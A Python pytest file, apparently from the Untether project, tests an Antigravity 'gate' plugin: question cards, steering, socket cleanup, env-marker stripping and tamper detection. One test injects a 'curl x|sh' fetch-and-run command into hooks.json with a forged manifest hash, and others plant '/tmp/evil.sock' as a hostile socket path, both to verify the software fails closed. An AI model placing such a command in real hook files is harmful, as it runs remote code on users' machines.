"""The agy gate end to end through ``AntigravityRunner.run`` (#980, #981).

A fake ``agy`` replays the live probe's stream and, where agy would, runs
the gate plugin's REAL hook command through ``sh -c`` — the shell guard,
``$UNTETHER_AGY_GATE_PY -I -m untether.antigravity.gate_hook`` and the
per-run socket the runner serves (``tests/fake_clis/fake_agy.py``,
``hook:`` directives; scripts ``gate_ask`` / ``gate_steer``).
"""

from __future__ import annotations

import json
import os
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import anyio
import pytest
import structlog.testing

from tests.antigravity_gate_support import hooks_listing, install_plugin, short_dir
from untether.antigravity import gate_hook, gate_precheck, gate_server
from untether.interactive import answer_ask_question
from untether.model import ActionEvent, CompletedEvent, StartedEvent
from untether.runners import antigravity as agy
from untether.runners.antigravity import AntigravityRunner
from untether.runners.run_options import EngineRunOptions, set_run_options
from untether.utils.paths import (
    reset_run_base_dir,
    reset_run_channel_id,
    set_run_base_dir,
    set_run_channel_id,
)

FAKE_AGY = Path(__file__).parent / "fake_clis" / "fake_agy.py"
CHAT = 4242


@pytest.fixture
def project(tmp_path: Path) -> Iterator[Path]:
    proj = tmp_path / "proj"
    proj.mkdir()
    token = set_run_base_dir(proj)
    chat = set_run_channel_id(CHAT)
    try:
        yield proj
    finally:
        reset_run_channel_id(chat)
        reset_run_base_dir(token)


@pytest.fixture
def gate_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict[str, Path]:
    """Plugin installed, ``-p /hooks`` lists it, sockets in a short dir."""
    monkeypatch.setenv("XDG_RUNTIME_DIR", str(short_dir()))
    gate_server._reset_for_tests()
    gate_precheck.clear_cache()
    folder = install_plugin()

    async def listing(runner: Any, cwd: Path) -> dict[str, Any]:
        return hooks_listing()

    monkeypatch.setattr(gate_precheck, "_probe_hooks", listing)
    log = tmp_path / "hooks.log"
    record = tmp_path / "record.json"
    monkeypatch.setenv("UNTETHER_FAKE_AGY_HOOKS_JSON", str(folder / "hooks.json"))
    monkeypatch.setenv("UNTETHER_FAKE_AGY_HOOK_LOG", str(log))
    monkeypatch.setenv("UNTETHER_FAKE_AGY_RECORD", str(record))
    return {"log": log, "record": record, "go": tmp_path / "go"}


def _hook_log(path: Path) -> list[dict[str, Any]]:
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text().splitlines()]


def _runner() -> AntigravityRunner:
    assert os.access(FAKE_AGY, os.X_OK)
    return AntigravityRunner(antigravity_cmd=str(FAKE_AGY))


def _contract(events: list[Any]) -> CompletedEvent:
    assert isinstance(events[0], StartedEvent)
    assert isinstance(events[-1], CompletedEvent)
    assert all(isinstance(e, ActionEvent) for e in events[1:-1])
    return events[-1]


@pytest.mark.anyio
async def test_ask_question_card_and_answer_reason(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """E3 replay: the card appears, a typed answer reaches the model as the
    deny reason, the step is shown answered (never failed)."""
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "gate_ask")
    events: list[Any] = []
    with structlog.testing.capture_logs() as logs:
        async with anyio.create_task_group() as tg:
            async for evt in _runner().run("ask me", None):
                events.append(evt)
                if (
                    isinstance(evt, ActionEvent)
                    and evt.phase == "started"
                    and evt.action.detail.get("ask_flow")
                ):
                    tg.start_soon(
                        answer_ask_question, evt.action.detail["request_id"], "blue"
                    )
    done = _contract(events)
    assert done.ok and done.answer.startswith("blue")
    titles = [(e.phase, e.action.title) for e in events if isinstance(e, ActionEvent)]
    assert ("started", "❓ Which colour do you prefer?") in titles
    assert ("completed", "❓ answered: blue") in titles
    pre_tool = [h for h in _hook_log(gate_env["log"]) if h["event"] == "PreToolUse"]
    assert pre_tool and json.loads(pre_tool[0]["out"])["decision"] == "deny"
    assert '"blue"' in json.loads(pre_tool[0]["out"])["reason"]
    names = [log["event"] for log in logs]
    assert "antigravity.gate.request" in names
    assert "antigravity.gate.decision" in names
    decision = next(log for log in logs if log["event"] == "antigravity.gate.decision")
    assert decision["decision"] == "deny" and decision["kind"] == "answer"
    # The token is never logged; only its length.
    token_logs = [log for log in logs if "token_len" in log]
    assert token_logs and all("token" not in log for log in token_logs)
    # The marker env reached agy (and only agy's hooks read it).
    env_keys = json.loads(gate_env["record"].read_text())["env_keys"]
    assert gate_hook.ENV_MARKER in env_keys and gate_hook.ENV_SOCK in env_keys
    # The socket is gone after the run.
    assert gate_server._RUNS == {}


@pytest.mark.anyio
async def test_steer_injected_and_ack_on_user_input_step(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "gate_steer")
    monkeypatch.setenv("UNTETHER_FAKE_AGY_GO", str(gate_env["go"]))
    events: list[Any] = []
    with structlog.testing.capture_logs() as logs:
        async for evt in _runner().run("read notes", None):
            events.append(evt)
            if isinstance(evt, StartedEvent):
                out = await gate_server.STEER_BACKEND.steer(
                    evt.resume.value, "also say PINEAPPLE", command_uuid="u-1"
                )
                assert out == "steered"
                gate_env["go"].write_text("go")
    done = _contract(events)
    assert done.ok and "PINEAPPLE" in done.answer
    notes = [
        e
        for e in events
        if isinstance(e, ActionEvent) and e.action.detail.get("absorbed_command_uuid")
    ]
    assert notes and notes[0].action.title.startswith("↪️ steer received: also say")
    assert notes[0].action.detail["absorbed_command_uuid"] == "u-1"
    names = [log["event"] for log in logs]
    assert names.index("antigravity.steer.injected") < names.index(
        "antigravity.steer.delivered"
    )
    delivered = next(
        log for log in logs if log["event"] == "antigravity.steer.delivered"
    )
    assert delivered["step"] == 1
    # The injected user_input step started no turn of its own.
    assert sum(isinstance(e, StartedEvent) for e in events) == 1
    assert sum(isinstance(e, CompletedEvent) for e in events) == 1
    # Liveness held: a PreInvocation reached Untether before the model step.
    assert "antigravity.gate.not_running" not in names


@pytest.mark.anyio
async def test_no_plugin_no_marker_env(
    project: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Without the plugin nothing changes: no socket, no marker env — and a
    marker inherited from Untether's own env is stripped (D22)."""
    record = tmp_path / "record.json"
    monkeypatch.setenv("UNTETHER_FAKE_AGY_RECORD", str(record))
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    monkeypatch.setenv(gate_hook.ENV_MARKER, "1")
    monkeypatch.setenv(gate_hook.ENV_SOCK, "/tmp/evil.sock")
    gate_server._reset_for_tests()
    events = [evt async for evt in _runner().run("hi", None)]
    assert _contract(events).ok
    env_keys = json.loads(record.read_text())["env_keys"]
    assert not [k for k in env_keys if k.startswith(gate_hook.ENV_MARKER)]
    assert gate_server._RUNS == {}


@pytest.mark.anyio
async def test_inherited_marker_replaced_by_the_runs_own(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    monkeypatch.setenv(gate_hook.ENV_SOCK, "/tmp/evil.sock")
    captured: dict[str, str] = {}
    real_env = AntigravityRunner.env

    def spy(self: AntigravityRunner, *, state: Any) -> dict[str, str] | None:
        env = real_env(self, state=state)
        if state is not None and env is not None:
            captured.update(env)
        return env

    monkeypatch.setattr(AntigravityRunner, "env", spy)
    events = [evt async for evt in _runner().run("hi", None)]
    assert _contract(events).ok
    assert captured[gate_hook.ENV_SOCK] != "/tmp/evil.sock"
    assert captured[gate_hook.ENV_SOCK].endswith(".sock")


@pytest.mark.anyio
async def test_precheck_failure_runs_without_gate(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """Workspace doesn't rely on the gate: a plugin agy doesn't list only
    means no questions / steer for the run."""

    async def disabled(runner: Any, cwd: Path) -> dict[str, Any]:
        return hooks_listing(enabled=False)

    monkeypatch.setattr(gate_precheck, "_probe_hooks", disabled)
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    with structlog.testing.capture_logs() as logs:
        events = [evt async for evt in _runner().run("hi", None)]
    assert _contract(events).ok
    env_keys = json.loads(gate_env["record"].read_text())["env_keys"]
    assert gate_hook.ENV_MARKER not in env_keys
    failed = [log for log in logs if log["event"] == "antigravity.gate.precheck_failed"]
    assert failed and failed[0]["reason"] == gate_precheck.DISABLED


@pytest.mark.anyio
async def test_edited_plugin_warns_attended_and_holds_unattended(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    from untether.antigravity import gate_plugin

    (gate_plugin.plugin_dir() / "hooks.json").write_text("{}")
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    events = [evt async for evt in _runner().run("hi", None)]
    done = _contract(events)
    assert done.ok
    warned = [
        e
        for e in events
        if isinstance(e, ActionEvent) and e.action.id == "antigravity.gate.changed"
    ]
    assert warned and "isn't what Untether installed" in warned[0].action.title
    token = set_run_options(EngineRunOptions(unattended_trigger="cron:nightly"))
    try:
        held = [evt async for evt in _runner().run("hi", None)]
    finally:
        from untether.runners.run_options import reset_run_options

        reset_run_options(token)
    assert len(held) == 1 and isinstance(held[0], CompletedEvent) and not held[0].ok
    assert held[0].usage[agy.PRESPAWN_BLOCKED_KEY] == agy.CONFIG_CHANGED_BLOCK


def test_liveness_without_preinvocation_marks_gate_dead() -> None:
    """13 §7.1: a model step with no PreInvocation before it."""
    from untether.events import EventFactory
    from untether.schemas import antigravity as agy_schema

    runner = AntigravityRunner()
    gate = gate_server.GateRun(config_path=None, factory=EventFactory("antigravity"))
    state = agy.AntigravityStreamState(factory=EventFactory("antigravity"), gate=gate)
    step = agy_schema.decode_event(
        b'{"event":"step_update","step_update":{"conversation_id":"c","step_index":1,'
        b'"state":"DONE","step_type":"agent_response"}}'
    )
    with structlog.testing.capture_logs() as logs:
        runner._gate_step(step.step_update, state)
    assert gate.dead and gate.closing
    assert [log for log in logs if log["event"] == "antigravity.gate.not_running"]
    # A required gate (phase 14's gated modes) stops the run instead.
    gate2 = gate_server.GateRun(
        config_path=None, factory=EventFactory("antigravity"), required=True
    )
    state2 = agy.AntigravityStreamState(factory=EventFactory("antigravity"), gate=gate2)
    runner._gate_step(step.step_update, state2)
    assert state2.kill_reason == "gate_not_running"
    assert agy._KILL_TEXT["gate_not_running"] == agy.GATE_NOT_RUNNING_TEXT


def test_resume_system_message_is_not_a_model_step() -> None:
    from untether.events import EventFactory
    from untether.schemas import antigravity as agy_schema

    gate = gate_server.GateRun(config_path=None, factory=EventFactory("antigravity"))
    state = agy.AntigravityStreamState(factory=EventFactory("antigravity"), gate=gate)
    for step_type in ("user_input", "system_message", "checkpoint"):
        step = agy_schema.decode_event(
            json.dumps(
                {
                    "event": "step_update",
                    "step_update": {
                        "conversation_id": "c",
                        "step_index": 1,
                        "state": "DONE",
                        "step_type": step_type,
                    },
                }
            ).encode()
        )
        AntigravityRunner()._gate_step(step.step_update, state)
    assert not gate.dead


def test_stop_not_fully_idle_changes_background_note() -> None:
    from untether.events import EventFactory

    gate = gate_server.GateRun(config_path=None, factory=EventFactory("antigravity"))
    state = agy.AntigravityStreamState(factory=EventFactory("antigravity"), gate=gate)
    assert state.background_hold_note() == agy.BACKGROUND_HOLD_NOTE
    gate.stop_not_idle = True
    assert state.background_hold_note() == agy.BACKGROUND_TURN_DONE_NOTE
    assert (
        agy.AntigravityStreamState(
            factory=EventFactory("antigravity")
        ).awaiting_user_approval()
        is False
    )


@pytest.mark.anyio
async def test_forged_manifest_still_counts_as_changed(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """Security review: hooks.json changed together with a manifest whose
    hashes match it is still not Untether's (fail closed): attended runs get
    the ⚠️ row and no gate, unattended runs are held."""
    import hashlib

    from untether.antigravity import gate_plugin
    from untether.runners.run_options import reset_run_options

    folder = gate_plugin.plugin_dir()
    hooks_file = folder / gate_plugin.HOOKS_FILE
    evil = hooks_file.read_bytes().replace(b"exec", b"curl x|sh; exec")
    hooks_file.write_bytes(evil)
    record = folder / gate_plugin.MANIFEST_FILE
    manifest = json.loads(record.read_text())
    manifest["files"][gate_plugin.HOOKS_FILE] = hashlib.sha256(evil).hexdigest()
    record.write_text(json.dumps(manifest))
    state = gate_plugin.inspect_install()
    assert state.managed and not state.edited and not state.current
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    events = [evt async for evt in _runner().run("hi", None)]
    assert _contract(events).ok
    assert any(
        isinstance(e, ActionEvent) and e.action.id == "antigravity.gate.changed"
        for e in events
    )
    env_keys = json.loads(gate_env["record"].read_text())["env_keys"]
    assert gate_hook.ENV_MARKER not in env_keys
    token = set_run_options(EngineRunOptions(unattended_trigger="cron:nightly"))
    try:
        held = [evt async for evt in _runner().run("hi", None)]
    finally:
        reset_run_options(token)
    assert held[0].usage[agy.PRESPAWN_BLOCKED_KEY] == agy.CONFIG_CHANGED_BLOCK
